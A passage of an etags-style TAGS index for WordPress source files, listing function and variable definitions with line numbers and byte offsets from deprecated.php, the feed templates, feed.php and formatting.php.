function the_content_rss($more_link_text='(more...)', $stripteaser=0, $more_file='', $cut = 0, $encode_html = 0) {stripteaser1707,48321
	$content = get_the_content($more_link_text, $stripteaser, $more_file);content1709,48502
	$content = apply_filters('the_content_rss', $content);content1710,48574
		$encode_html = 2;encode_html1712,48660
		$content = esc_html($content);content1714,48707
		$cut = 0;cut1715,48740
		$content = make_url_footnote($content);content1717,48786
		$content = strip_tags($content);content1719,48862
		$blah = explode(' ', $content);blah1722,48915
			$k = $cut;k1724,48980
			$use_dotdotdot = 1;use_dotdotdot1725,48994
			$k = count($blah);k1727,49028
			$use_dotdotdot = 0;use_dotdotdot1728,49050
		for ( $i=0; $i<$k; $i++ )i1732,49156
		$content = $excerpt;content1735,49259
	$content = str_replace(']]>', ']]&gt;', $content);content1737,49285
function make_url_footnote( $content ) {make_url_footnote1753,49720
	$links_summary = "\n";links_summary1756,49893
	for ( $i=0; $i<count($matches[0]); $i++ ) {i1757,49917
		$link_match = $matches[0][$i];link_match1758,49962
		$link_number = '['.($i+1).']';link_number1759,49995
		$link_url = $matches[2][$i];link_url1760,50028
		$link_text = $matches[4][$i];link_text1761,50059
		$content = str_replace( $link_match, $link_text . ' ' . $link_number, $content );content1762,50091
		$link_url = ( ( strtolower( substr( $link_url, 0, 7 ) ) != 'http://' ) && ( strtolower( substr( $link_url, 0, 8 ) ) != 'https://' ) ) ? get_option( 'home' ) . $link_url : $link_url;link_url1763,50175
	$content  = strip_tags( $content );content1766,50421
 * In order to use the separate contexts, the _c() function is used and theis1777,50724
function _c( $text, $domain = 'default' ) {_c1793,51329
function _c( $text, $domain = 'default' ) {domain1793,51329
function translate_with_context( $text, $domain = 'default' ) {translate_with_context1812,51847
function translate_with_context( $text, $domain = 'default' ) {domain1812,51847
function _nc( $single, $plural, $number, $domain = 'default' ) {_nc1829,52301
function _nc( $single, $plural, $number, $domain = 'default' ) {domain1829,52301
function __ngettext() {__ngettext1842,52637
	$args = func_get_args();args1844,52715
function __ngettext_noop() {__ngettext_noop1856,52946
	$args = func_get_args();args1858,53034
function get_alloptions() {get_alloptions1873,53349
function get_the_attachment_link($id = 0, $fullsize = false, $max_dims = false, $permalink = false) {get_the_attachment_link1892,53955
function get_the_attachment_link($id = 0, $fullsize = false, $max_dims = false, $permalink = false) {fullsize1892,53955
	$id = (int) $id;id1894,54131
	$_post = & get_post($id);_post1895,54149
		$url = get_attachment_link($_post->ID);url1901,54321
	$post_title = esc_attr($_post->post_title);post_title1903,54364
	$innerHTML = get_attachment_innerHTML($_post->ID, $fullsize, $max_dims);innerHTML1905,54410
function get_attachment_icon_src( $id = 0, $fullsize = false ) {get_attachment_icon_src1921,54898
function get_attachment_icon_src( $id = 0, $fullsize = false ) {id1921,54898
	$id = (int) $id;id1923,55042
	$file = get_attached_file( $post->ID );file1927,55110
	if ( !$fullsize && $src = wp_get_attachment_thumb_url( $post->ID ) ) {src1929,55152
		$src_file = basename($src);src_file1932,55282
		$class = 'attachmentthumb';class1933,55312
		$src = wp_get_attachment_url( $post->ID );src1937,55437
		$src_file = & $file;src_file1938,55482
		$class = 'attachmentimage';class1939,55505
	} elseif ( $src = wp_mime_type_icon( $post->ID ) ) {src1940,55535
		$icon_dir = apply_filters( 'icon_dir', get_template_directory() . '/images' );icon_dir1943,55659
		$src_file = $icon_dir . '/' . basename($src);src_file1944,55740
function get_attachment_icon( $id = 0, $fullsize = false, $max_dims = false ) {get_attachment_icon1966,56275
function get_attachment_icon( $id = 0, $fullsize = false, $max_dims = false ) {id1966,56275
	$id = (int) $id;id1968,56430
		$imagesize = getimagesize($src_file);imagesize1980,56749
			$actual_aspect = $imagesize[0] / $imagesize[1];actual_aspect1983,56863
			$desired_aspect = $max_dims[0] / $max_dims[1];desired_aspect1984,56914
				$height = $actual_aspect * $max_dims[0];height1987,57011
				$constraint = "width='{$max_dims[0]}' ";constraint1988,57056
				$width = $max_dims[1] / $actual_aspect;width1991,57165
				$constraint = "height='{$max_dims[1]}' ";constraint1992,57209
			$constraint = '';constraint1997,57380
		$constraint = '';constraint2000,57415
	$post_title = esc_attr($post->post_title);post_title2003,57439
	$icon = "<img src='$src' title='$post_title' alt='$post_title' $constraint/>";icon2005,57484
function get_attachment_innerHTML($id = 0, $fullsize = false, $max_dims = false) {get_attachment_innerHTML2023,58001
function get_attachment_innerHTML($id = 0, $fullsize = false, $max_dims = false) {fullsize2023,58001
	$id = (int) $id;id2025,58159
	if ( $innerHTML = get_attachment_icon($post->ID, $fullsize, $max_dims))innerHTML2029,58227
	$innerHTML = esc_attr($post->post_title);innerHTML2032,58322
function get_link($bookmark_id, $output = OBJECT, $filter = 'raw') {get_link2049,58701
function get_link($bookmark_id, $output = OBJECT, $filter = 'raw') {output2049,58701
function sanitize_url( $url, $protocols = null ) {sanitize_url2066,59192
function sanitize_url( $url, $protocols = null ) {protocols2066,59192
function clean_url( $url, $protocols = null, $context = 'display' ) {clean_url2088,59969
function clean_url( $url, $protocols = null, $context = 'display' ) {protocols2088,59969
	if ( $context == 'db' )context2089,60039
		_deprecated_function( 'clean_url( $context = \'db\' )', '3.0', 'esc_url_raw()' );context2090,60064
function js_escape( $text ) {js_escape2109,60570
function wp_specialchars( $string, $quote_style = ENT_NOQUOTES, $charset = false, $double_encode = false ) {wp_specialchars2121,60796
function wp_specialchars( $string, $quote_style = ENT_NOQUOTES, $charset = false, $double_encode = false ) {quote_style2121,60796
		$args = func_get_args();args2124,61059
function attribute_escape( $text ) {attribute_escape2142,61366
function register_sidebar_widget($name, $output_callback, $classname = '') {register_sidebar_widget2167,62194
function register_sidebar_widget($name, $output_callback, $classname = '') {classname2167,62194
			$name = sprintf($name[0], $name[2]);name2172,62413
			$name = $name[0];name2174,62460
	$id = sanitize_title($name);id2177,62485
	$options = array();options2178,62515
	$params = array_slice(func_get_args(), 2);params2181,62626
	$args = array($id, $name, $output_callback, $options);args2182,62670
		$args = array_merge($args, $params);args2184,62750
function unregister_sidebar_widget($id) {unregister_sidebar_widget2199,63081
function register_widget_control($name, $control_callback, $width = '', $height = '') {register_widget_control2224,63933
function register_widget_control($name, $control_callback, $width = '', $height = '') {width2224,63933
			$name = sprintf($name[0], $name[2]);name2229,64163
			$name = $name[0];name2231,64210
	$id = sanitize_title($name);id2234,64235
	$options = array();options2235,64265
	$params = array_slice(func_get_args(), 4);params2240,64395
	$args = array($id, $name, $control_callback, $options);args2241,64439
		$args = array_merge($args, $params);args2243,64520
function unregister_widget_control($id) {unregister_widget_control2258,64851
function delete_usermeta( $user_id, $meta_key, $meta_value = '' ) {delete_usermeta2276,65356
function delete_usermeta( $user_id, $meta_key, $meta_value = '' ) {meta_value2276,65356
	$meta_key = preg_replace('|[^a-z0-9_]|i', '', $meta_key);meta_key2281,65555
		$meta_value = serialize($meta_value);meta_value2284,65671
	$meta_value = trim( $meta_value );meta_value2285,65711
	$cur = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->usermeta WHERE user_id = %d AND meta_key = %s", $user_id, $meta_key) );cur2287,65748
 * If $user_id is not a number, then the function will fail over with a 'false'will2309,66556
function get_usermeta( $user_id, $meta_key = '' ) {get_usermeta2323,67066
function get_usermeta( $user_id, $meta_key = '' ) {meta_key2323,67066
	$user_id = (int) $user_id;user_id2326,67198
		$meta_key = preg_replace('|[^a-z0-9_]|i', '', $meta_key);meta_key2332,67290
		$user = wp_cache_get($user_id, 'users');user2333,67350
			$metas = array($user->$meta_key);metas2336,67479
			$metas = $wpdb->get_col( $wpdb->prepare("SELECT meta_value FROM $wpdb->usermeta WHERE user_id = %d AND meta_key = %s", $user_id, $meta_key) );metas2338,67523
		$metas = $wpdb->get_col( $wpdb->prepare("SELECT meta_value FROM $wpdb->usermeta WHERE user_id = %d", $user_id) );metas2340,67679
	$metas = array_map('maybe_unserialize', $metas);metas2350,67893
function update_usermeta( $user_id, $meta_key, $meta_value ) {update_usermeta2377,68571
	$meta_key = preg_replace('|[^a-z0-9_]|i', '', $meta_key);meta_key2382,68765
		$meta_value = stripslashes($meta_value);meta_value2386,68940
	$meta_value = maybe_serialize($meta_value);meta_value2387,68983
	$cur = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->usermeta WHERE user_id = %d AND meta_key = %s", $user_id, $meta_key) );cur2393,69107
function get_users_of_blog( $id = '' ) {get_users_of_blog2430,70274
function get_users_of_blog( $id = '' ) {id2430,70274
		$id = (int) $blog_id;id2435,70421
	$blog_prefix = $wpdb->get_blog_prefix($id);blog_prefix2436,70445
	$users = $wpdb->get_results( "SELECT user_id, user_id AS ID, user_login, display_name, user_email, meta_value FROM $wpdb->users, $wpdb->usermeta WHERE {$wpdb->users}.ID = {$wpdb->usermeta}.user_id AND meta_key = '{$blog_prefix}capabilities' ORDER BY {$wpdb->usermeta}.user_id" );users2437,70490
function automatic_feed_links( $add = true ) {automatic_feed_links2450,71051
function automatic_feed_links( $add = true ) {add2450,71051
function get_profile( $field, $user = false ) {get_profile2467,71504
function get_profile( $field, $user = false ) {user2467,71504
		$user = get_user_by( 'login', $user );user2470,71639
		$user = $user->ID;user2471,71680
function get_usernumposts( $userid ) {get_usernumposts2484,71902
function funky_javascript_callback($matches) {funky_javascript_callback2499,72241
function funky_javascript_fix($text) {funky_javascript_fix2516,72604
		$text =  preg_replace_callback("/\%u([0-9A-F]{4,4})/",text2522,72791
function is_taxonomy( $taxonomy ) {is_taxonomy2540,73165
function is_term( $term, $taxonomy = '', $parent = 0 ) {is_term2558,73679
function is_term( $term, $taxonomy = '', $parent = 0 ) {taxonomy2558,73679
function is_plugin_page() {is_plugin_page2574,74078
 * This function does not appear to be used anymore or does not appear to bedoes2588,74278
 * needed. It might be a legacy function left over from when there was a needleft2589,74355
function update_category_cache() {update_category_cache2597,74551
function wp_timezone_supported() {wp_timezone_supported2611,74752
function the_editor($content, $id = 'content', $prev_id = 'title', $media_buttons = true, $tab_index = 2, $extended = true) {the_editor2631,75298
function the_editor($content, $id = 'content', $prev_id = 'title', $media_buttons = true, $tab_index = 2, $extended = true) {id2631,75298
function get_user_metavalues($ids) {get_user_metavalues2647,75859
	$objects = array();objects2650,75943
	$ids = array_map('intval', $ids);ids2652,75965
	$metas = update_meta_cache('user', $ids);metas2656,76053
	foreach ( $metas as $id => $meta ) {id2658,76097
		foreach ( $meta as $key => $metavalues ) {key2659,76135
function sanitize_user_object($user, $context = 'display') {sanitize_user_object2681,76780
function sanitize_user_object($user, $context = 'display') {context2681,76780
			$vars = get_object_vars($user);vars2688,76997
function get_boundary_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '', $start = true) {get_boundary_post_rel_link2720,77969
function get_boundary_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '', $start = true) {in_same_cat2720,77969
	$posts = get_boundary_post($in_same_cat, $excluded_categories, $start);posts2723,78137
	$post = $posts[0];post2729,78370
	$date = mysql2date(get_option('date_format'), $post->post_date);date2734,78492
	$title = str_replace('%title', $post->post_title, $title);title2736,78559
	$title = str_replace('%date', $date, $title);title2737,78619
	$title = apply_filters('the_title', $title, $post->ID);title2738,78666
	$link = $start ? "<link rel='start' title='" : "<link rel='end' title='";link2740,78724
	$boundary = $start ? 'start' : 'end';boundary2744,78884
function start_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {start_post_rel_link2758,79292
function start_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {in_same_cat2758,79292
function get_index_rel_link() {get_index_rel_link2772,79629
	$link = "<link rel='index' title='" . esc_attr( get_bloginfo( 'name', 'display' ) ) . "' href='" . esc_url( user_trailingslashit( get_bloginfo( 'url', 'display' ) ) ) . "' />\n";link2775,79708
function index_rel_link() {index_rel_link2785,80036
function get_parent_post_rel_link($title = '%title') {get_parent_post_rel_link2800,80300
		$post = & get_post($GLOBALS['post']->post_parent);post2804,80482
	$date = mysql2date(get_option('date_format'), $post->post_date);date2809,80568
	$title = str_replace('%title', $post->post_title, $title);title2811,80635
	$title = str_replace('%date', $date, $title);title2812,80695
	$title = apply_filters('the_title', $title, $post->ID);title2813,80742
	$link = "<link rel='up' title='";link2815,80800
function parent_post_rel_link($title = '%title') {parent_post_rel_link2828,81072
function wp_admin_bar_dashboard_view_site_menu( $wp_admin_bar ) {wp_admin_bar_dashboard_view_site_menu2840,81303
	$user_id = get_current_user_id();user_id2843,81416
function is_blog_user( $blog_id = 0 ) {is_blog_user2866,82180
function is_blog_user( $blog_id = 0 ) {blog_id2866,82180
function debug_fopen( $filename, $mode ) {debug_fopen2880,82543
function debug_fwrite( $fp, $string ) {debug_fwrite2893,82856
function debug_fclose( $fp ) {debug_fclose2907,83189
function get_themes() {get_themes2925,83715
	$themes = wp_get_themes();themes2932,83875
	$wp_themes = array();wp_themes2933,83903
		$name = $theme->get('Name');name2936,83960
function get_theme( $theme ) {get_theme2957,84411
	$themes = get_themes();themes2960,84520
function get_current_theme() {get_current_theme2976,84824
	if ( $theme = get_option( 'current_theme' ) )theme2979,84920
function clean_pre($matches) {clean_pre2997,85399
		$text = $matches[1] . $matches[2] . "</pre>";text3001,85504
		$text = $matches;text3003,85558
	$text = str_replace(array('<br />', '<br/>', '<br>'), array('', '', ''), $text);text3005,85579
	$text = str_replace('<p>', "\n", $text);text3006,85661
	$text = str_replace('</p>', '', $text);text3007,85703
function add_custom_image_header( $wp_head_callback, $admin_head_callback, $admin_preview_callback = '' ) {add_custom_image_header3025,86225
function add_custom_image_header( $wp_head_callback, $admin_head_callback, $admin_preview_callback = '' ) {admin_preview_callback3025,86225
	$args = array(args3027,86428
function remove_custom_image_header() {remove_custom_image_header3046,86908
function add_custom_background( $wp_head_callback = '', $admin_head_callback = '', $admin_preview_callback = '' ) {add_custom_background3063,87571
function add_custom_background( $wp_head_callback = '', $admin_head_callback = '', $admin_preview_callback = '' ) {wp_head_callback3063,87571
	$args = array();args3065,87786
function remove_custom_background() {remove_custom_background3083,88260
function get_theme_data( $theme_file ) {get_theme_data3099,88679
	$theme = new WP_Theme( basename( dirname( $theme_file ) ), dirname( dirname( $theme_file ) ) );theme3101,88782
	$theme_data = array(theme_data3103,88880
function update_page_cache( &$pages ) {update_page_cache3135,89827
function clean_page_cache( $id ) {clean_page_cache3154,90295

wordpress/wp-includes/feed-atom-comments.php,305
	$comment_post = $GLOBALS['post'] = get_post( $comment->comment_post_ID );comment_post45,2096
				$title = get_the_title($comment_post->ID);title50,2225
				$title = apply_filters('the_title_rss', $title);title51,2272
	$parent_comment = get_comment($comment->comment_parent);parent_comment77,3723

wordpress/wp-includes/feed-atom.php,124
$more = 1;more9,198
			<?php $author_url = get_the_author_meta('url'); if ( !empty($author_url) ) : ?>author_url33,1109

wordpress/wp-includes/feed-rdf.php,22
$more = 1;more9,203

wordpress/wp-includes/feed-rss.php,22
$more = 1;more9,210

wordpress/wp-includes/feed-rss2-comments.php,224
	$comment_post = $GLOBALS['post'] = get_post( $comment->comment_post_ID );comment_post37,1582
				$title = get_the_title($comment_post->ID);title42,1710
				$title = apply_filters('the_title_rss', $title);title43,1757

wordpress/wp-includes/feed-rss2.php,22
$more = 1;more9,202

wordpress/wp-includes/feed.php,4102
function get_bloginfo_rss($show = '') {get_bloginfo_rss28,713
	$info = strip_tags(get_bloginfo($show));info29,753
function bloginfo_rss($show = '') {bloginfo_rss48,1395
function get_default_feed() {get_default_feed65,1849
	$default_feed = apply_filters('default_feed', 'rss2');default_feed66,1879
 * @uses wp_title() See function for $sep parameter usage.for77,2172
function get_wp_title_rss($sep = '&#187;') {get_wp_title_rss82,2395
	$title = wp_title($sep, false);title83,2440
	$title = apply_filters('get_wp_title_rss', $title);title86,2541
function wp_title_rss($sep = '&#187;') {wp_title_rss101,2880
function get_the_title_rss() {get_the_title_rss115,3210
	$title = get_the_title();title116,3241
	$title = apply_filters('the_title_rss', $title);title117,3268
function the_title_rss() {the_title_rss129,3510
function get_the_content_feed($feed_type = null) {get_the_content_feed144,3859
		$feed_type = get_default_feed();feed_type146,3930
	$content = apply_filters('the_content', get_the_content());content148,3966
	$content = str_replace(']]>', ']]&gt;', $content);content149,4027
function the_content_feed($feed_type = null) {the_content_feed164,4438
function the_excerpt_rss() {the_excerpt_rss176,4708
	$output = get_the_excerpt();output177,4737
function the_permalink_rss() {the_permalink_rss189,5015
function comments_link_feed() {comments_link_feed199,5238
function comment_guid($comment_id = null) {comment_guid212,5532
function get_comment_guid($comment_id = null) {get_comment_guid226,5921
	$comment = get_comment($comment_id);comment227,5969
function comment_link() {comment_link240,6207
function get_comment_author_rss() {get_comment_author_rss255,6545
function comment_author_rss() {comment_author_rss266,6772
function comment_text_rss() {comment_text_rss279,7074
	$comment_text = get_comment_text();comment_text280,7104
	$comment_text = apply_filters('comment_text_rss', $comment_text);comment_text281,7141
function get_the_category_rss($type = null) {get_the_category_rss300,7757
		$type = get_default_feed();type302,7824
	$categories = get_the_category();categories303,7854
	$tags = get_the_tags();tags304,7889
	$the_list = '';the_list305,7914
	$cat_names = array();cat_names306,7931
	$filter = 'rss';filter308,7955
		$filter = 'raw';filter310,7997
	$cat_names = array_unique($cat_names);cat_names320,8356
function the_category_rss($type = null) {the_category_rss344,9194
function html_type_rss() {html_type_rss357,9455
	$type = get_bloginfo('html_type');type358,9482
		$type = 'xhtml';type360,9557
		$type = 'html';type362,9582
 * Also uses the function get_post_custom() to get the post's 'enclosure'get_post_custom373,9847
function rss_enclosure() {rss_enclosure384,10288
	foreach ( (array) get_post_custom() as $key => $val) {key388,10359
				$enclosure = explode("\n", $enc);enclosure391,10482
				$t = preg_split('/[ \t]/', trim($enclosure[2]) );t394,10604
				$type = $t[0];type395,10658
 * Also uses the function get_post_custom() to get the post's 'enclosure'get_post_custom410,11100
function atom_enclosure() {atom_enclosure420,11535
	foreach ( (array) get_post_custom() as $key => $val ) {key424,11607
				$enclosure = explode("\n", $enc);enclosure427,11731
function prep_atom_text_construct($data) {prep_atom_text_construct453,12596
	$parser = xml_parser_create();parser458,12743
	$code = xml_get_error_code($parser);code460,12830
			$data = "<div xmlns='http://www.w3.org/1999/xhtml'>$data</div>";data467,12992
function self_link() {self_link488,13445
	$host = @parse_url(home_url());host489,13468
	$host = $host['host'];host490,13501
function feed_content_type( $type = '' ) {feed_content_type505,13763
function feed_content_type( $type = '' ) {type505,13763
		$type = get_default_feed();type507,13827
	$types = array(types509,13858
	$content_type = ( !empty($types[$type]) ) ? $types[$type] : 'application/octet-stream';content_type517,14049
function fetch_feed($url) {fetch_feed530,14431
	$feed = new SimplePie();feed533,14513

wordpress/wp-includes/formatting.php,41168
function wptexturize($text) {wptexturize29,694
		$opening_quote = _x( '&#8220;', 'opening curly double quote' );opening_quote37,1059
		$closing_quote = _x( '&#8221;', 'closing curly double quote' );closing_quote39,1173
		$apos = _x( '&#8217;', 'apostrophe' );apos42,1304
		$prime = _x( '&#8242;', 'prime' );prime45,1404
		$double_prime = _x( '&#8243;', 'double prime' );double_prime47,1508
		$opening_single_quote = _x( '&#8216;', 'opening curly single quote' );opening_single_quote50,1608
		$closing_single_quote = _x( '&#8217;', 'closing curly single quote' );closing_single_quote52,1729
		$en_dash = _x( '&#8211;', 'en dash' );en_dash55,1832
		$em_dash = _x( '&#8212;', 'em dash' );em_dash57,1902
		$default_no_texturize_tags = array('pre', 'code', 'kbd', 'style', 'script', 'tt');default_no_texturize_tags59,1944
		$default_no_texturize_shortcodes = array('code');default_no_texturize_shortcodes60,2029
			$cockney = array_keys($wp_cockneyreplace);cockney64,2178
			$cockneyreplace = array_values($wp_cockneyreplace);cockneyreplace65,2224
			$cockney = array( "'tain't", "'twere", "'twas", "'tis", "'twill", "'til", "'bout", "'nuff", "'round", "'cause" );cockney67,2354
			$cockneyreplace = array( $apos . "tain" . $apos . "t", $apos . "twere", $apos . "twas", $apos . "tis", $apos . "twill", $apos . "til", $apos . "bout", $apos . "nuff", $apos . "round", $apos . "cause" );cockneyreplace68,2471
			$cockney = $cockneyreplace = array();cockney70,2688
		$static_characters = array_merge( array( '---', ' -- ', '--', ' - ', 'xn&#8211;', '...', '``', '\'\'', ' (tm)' ), $cockney );static_characters73,2734
		$static_replacements = array_merge( array( $em_dash, ' ' . $em_dash . ' ', $en_dash, ' ' . $en_dash . ' ', 'xn--', '&#8230;', $opening_quote, $closing_quote, ' &#8482;' ), $cockneyreplace );static_replacements74,2862
		$dynamic = array();dynamic76,3056
		$dynamic_characters = array_keys( $dynamic );dynamic_characters98,4229
		$dynamic_replacements = array_values( $dynamic );dynamic_replacements99,4277
	$no_texturize_tags = '(' . implode('|', apply_filters('no_texturize_tags', $default_no_texturize_tags) ) . ')';no_texturize_tags104,4502
	$no_texturize_shortcodes = '(' . implode('|', apply_filters('no_texturize_shortcodes', $default_no_texturize_shortcodes) ) . ')';no_texturize_shortcodes105,4615
	$no_texturize_tags_stack = array();no_texturize_tags_stack107,4747
	$no_texturize_shortcodes_stack = array();no_texturize_shortcodes_stack108,4784
	$textarr = preg_split('/(<.*>|\[.*\])/Us', $text, -1, PREG_SPLIT_DELIM_CAPTURE);textarr110,4828
		$first = $curl[0];first117,5064
			$curl = str_replace($static_characters, $static_replacements, $curl);curl124,5511
			$curl = preg_replace($dynamic_characters, $dynamic_replacements, $curl);curl126,5610
		$curl = preg_replace('/&([^#])(?![a-zA-Z1-4]{1,8};)/', '&#038;$1', $curl);curl128,5690
function _wptexturize_pushpop_element($text, &$stack, $disabled_elements, $opening = '<', $closing = '>') {_wptexturize_pushpop_element147,6386
function _wptexturize_pushpop_element($text, &$stack, $disabled_elements, $opening = '<', $closing = '>') {opening147,6386
		$c = preg_quote($closing, '/');c164,7099
			$last = array_pop($stack);last166,7219
function wpautop($pee, $br = true) {wpautop189,7944
function wpautop($pee, $br = true) {br189,7944
	$pre_tags = array();pre_tags190,7981
	$pee = $pee . "\n"; // just to make things a little easier, pad the endpee195,8044
		$pee_parts = explode( '</pre>', $pee );pee_parts198,8159
		$last_pee = array_pop($pee_parts);last_pee199,8201
		$pee = '';pee200,8238
		$i = 0;i201,8251
			$start = strpos($pee_part, '<pre');start204,8302
			if ( $start === false ) {start207,8364
			$name = "<pre wp-pre-tag-$i></pre>";name212,8436
	$pee = preg_replace('|<br />\s*<br />|', "\n\n", $pee);pee222,8629
	$allblocks = '(?:table|thead|tfoot|caption|col|colgroup|tbody|tr|td|th|div|dl|dd|dt|ul|ol|li|pre|select|option|form|map|area|blockquote|address|math|style|p|h[1-6]|hr|fieldset|legend|section|article|aside|hgroup|header|footer|nav|figure|figcaption|details|menu|summary)';allblocks224,8716
	$pee = preg_replace('!(<' . $allblocks . '[^>]*>)!', "\n$1", $pee);pee225,8989
	$pee = preg_replace('!(</' . $allblocks . '>)!', "$1\n\n", $pee);pee226,9058
	$pee = str_replace(array("\r\n", "\r"), "\n", $pee); // cross-platform newlinespee227,9125
		$pee = preg_replace('|\s*<param([^>]*)>\s*|', "<param$1>", $pee); // no pee inside object/embedpee229,9250
		$pee = preg_replace('|\s*</embed>\s*|', '</embed>', $pee);pee230,9348
	$pee = preg_replace("/\n\n+/", "\n\n", $pee); // take care of duplicatespee232,9412
	$pees = preg_split('/\n\s*\n/', $pee, -1, PREG_SPLIT_NO_EMPTY);pees234,9532
	$pee = '';pee235,9597
	$pee = preg_replace('|<p>\s*</p>|', '', $pee); // under certain strange conditions it could create a P of entirely whitespacepee238,9689
	$pee = preg_replace('!<p>([^<]+)</(div|address|form)>!', "<p>$1</p></$2>", $pee);pee239,9816
	$pee = preg_replace('!<p>\s*(</?' . $allblocks . '[^>]*>)\s*</p>!', "$1", $pee); // don't pee all over a tagpee240,9899
	$pee = preg_replace("|<p>(<li.+?)</p>|", "$1", $pee); // problem with nested listspee241,10009
	$pee = preg_replace('|<p><blockquote([^>]*)>|i', "<blockquote$1><p>", $pee);pee242,10093
	$pee = str_replace('</blockquote></p>', '</p></blockquote>', $pee);pee243,10171
	$pee = preg_replace('!<p>\s*(</?' . $allblocks . '[^>]*>)!', "$1", $pee);pee244,10240
	$pee = preg_replace('!(</?' . $allblocks . '[^>]*>)\s*</p>!', "$1", $pee);pee245,10315
		$pee = preg_replace_callback('/<(script|style).*?<\/\\1>/s', '_autop_newline_preservation_helper', $pee);pee247,10405
		$pee = preg_replace('|(?<!<br />)\s*\n|', "<br />\n", $pee); // optionally make line breakspee248,10513
		$pee = str_replace('<WPPreserveNewline />', "\n", $pee);pee249,10607
	$pee = preg_replace('!(</?' . $allblocks . '[^>]*>)\s*<br />!', "$1", $pee);pee251,10669
	$pee = preg_replace('!<br />(\s*</?(?:p|li|div|dl|dd|dt|th|pre|td|ul|ol)[^>]*>)!', '$1', $pee);pee252,10747
	$pee = preg_replace( "|\n</p>$|", '</p>', $pee );pee253,10844
		$pee = str_replace(array_keys($pre_tags), array_values($pre_tags), $pee);pee256,10922
 * Newline preservation help function for wpautopfor262,11020
function _autop_newline_preservation_helper( $matches ) {_autop_newline_preservation_helper269,11192
function shortcode_unautop( $pee ) {shortcode_unautop283,11537
	$tagregexp = join( '|', array_map( 'preg_quote', array_keys( $shortcode_tags ) ) );tagregexp290,11686
	$pattern =pattern292,11772
 * NOTE: This function checks for 5-Byte sequences, UTF8checks330,13441
function seems_utf8($str) {seems_utf8339,13737
	$length = strlen($str);length340,13765
		$c = ord($str[$i]);c342,13824
		if ($c < 0x80) $n = 0; # 0bbbbbbbn343,13846
		elseif (($c & 0xE0) == 0xC0) $n=1; # 110bbbbbn344,13882
		elseif (($c & 0xF0) == 0xE0) $n=2; # 1110bbbbn345,13930
		elseif (($c & 0xF8) == 0xF0) $n=3; # 11110bbbn346,13978
		elseif (($c & 0xFC) == 0xF8) $n=4; # 111110bbn347,14026
		elseif (($c & 0xFE) == 0xFC) $n=5; # 1111110bn348,14074
function _wp_specialchars( $string, $quote_style = ENT_NOQUOTES, $charset = false, $double_encode = false ) {_wp_specialchars374,15260
function _wp_specialchars( $string, $quote_style = ENT_NOQUOTES, $charset = false, $double_encode = false ) {quote_style374,15260
	$string = (string) $string;string375,15370
	// Account for the previous behaviour of the function when the $quote_style is not an accepted valuewhen384,15581
		$quote_style = ENT_NOQUOTES;quote_style386,15713
		$quote_style = ENT_QUOTES;quote_style388,15827
		static $_charset;_charset392,15965
			$alloptions = wp_load_alloptions();alloptions394,16017
			$_charset = isset( $alloptions['blog_charset'] ) ? $alloptions['blog_charset'] : '';_charset395,16056
		$charset = $_charset;charset397,16148
		$charset = 'UTF-8';charset401,16239
	$_quote_style = $quote_style;_quote_style403,16262
	if ( $quote_style === 'double' ) {quote_style405,16294
		$quote_style = ENT_COMPAT;quote_style406,16330
		$_quote_style = ENT_COMPAT;_quote_style407,16359
	} elseif ( $quote_style === 'single' ) {quote_style408,16389
		$quote_style = ENT_NOQUOTES;quote_style409,16431
		$string = @htmlspecialchars( $string, $quote_style, $charset );string414,16528
		$string = wp_specialchars_decode( $string, $_quote_style );string417,16629
		$string = wp_kses_normalize_entities( $string );string420,16750
		$string = preg_split( '/(&#?x?[0-9a-z]+;)/i', $string, -1, PREG_SPLIT_DELIM_CAPTURE );string423,16848
		for ( $i = 0; $i < count( $string ); $i += 2 )i425,16938
		$string = implode( '', $string );string428,17063
		$string = str_replace( "'", '&#039;', $string );string433,17166
function wp_specialchars_decode( $string, $quote_style = ENT_NOQUOTES ) {wp_specialchars_decode452,17991
function wp_specialchars_decode( $string, $quote_style = ENT_NOQUOTES ) {quote_style452,17991
	$string = (string) $string;string453,18065
		$quote_style = ENT_NOQUOTES;quote_style466,18415
		$quote_style = ENT_QUOTES;quote_style468,18532
	$single = array( '&#039;'  => '\'', '&#x27;' => '\'' );single472,18636
	$single_preg = array( '/&#0*39;/'  => '&#039;', '/&#x0*27;/i' => '&#x27;' );single_preg473,18693
	$double = array( '&quot;' => '"', '&#034;'  => '"', '&#x22;' => '"' );double474,18771
	$double_preg = array( '/&#0*34;/'  => '&#034;', '/&#x0*22;/i' => '&#x22;' );double_preg475,18843
	$others = array( '&lt;'   => '<', '&#060;'  => '<', '&gt;'   => '>', '&#062;'  => '>', '&amp;'  => '&', '&#038;'  => '&', '&#x26;' => '&' );others476,18921
	$others_preg = array( '/&#0*60;/'  => '&#060;', '/&#0*62;/'  => '&#062;', '/&#0*38;/'  => '&#038;', '/&#x0*26;/i' => '&#x26;' );others_preg477,19063
	if ( $quote_style === ENT_QUOTES ) {quote_style479,19194
		$translation = array_merge( $single, $double, $others );translation480,19232
		$translation_preg = array_merge( $single_preg, $double_preg, $others_preg );translation_preg481,19291
	} elseif ( $quote_style === ENT_COMPAT || $quote_style === 'double' ) {quote_style482,19370
		$translation = array_merge( $double, $others );translation483,19443
		$translation_preg = array_merge( $double_preg, $others_preg );translation_preg484,19493
	} elseif ( $quote_style === 'single' ) {quote_style485,19558
		$translation = array_merge( $single, $others );translation486,19600
		$translation_preg = array_merge( $single_preg, $others_preg );translation_preg487,19650
	} elseif ( $quote_style === ENT_NOQUOTES ) {quote_style488,19715
		$translation = $others;translation489,19761
		$translation_preg = $others_preg;translation_preg490,19787
	$string = preg_replace( array_keys( $translation_preg ), array_values( $translation_preg ), $string );string494,19871
function wp_check_invalid_utf8( $string, $strip = false ) {wp_check_invalid_utf8509,20334
function wp_check_invalid_utf8( $string, $strip = false ) {strip509,20334
	$string = (string) $string;string510,20394
	static $is_utf8;is_utf8517,20554
		$is_utf8 = in_array( get_option( 'blog_charset' ), array( 'utf8', 'utf-8', 'UTF8', 'UTF-8' ) );is_utf8519,20601
	static $utf8_pcre;utf8_pcre526,20843
		$utf8_pcre = @preg_match( '/^./u', 'a' );utf8_pcre528,20894
function utf8_uri_encode( $utf8_string, $length = 0 ) {utf8_uri_encode557,21603
function utf8_uri_encode( $utf8_string, $length = 0 ) {length557,21603
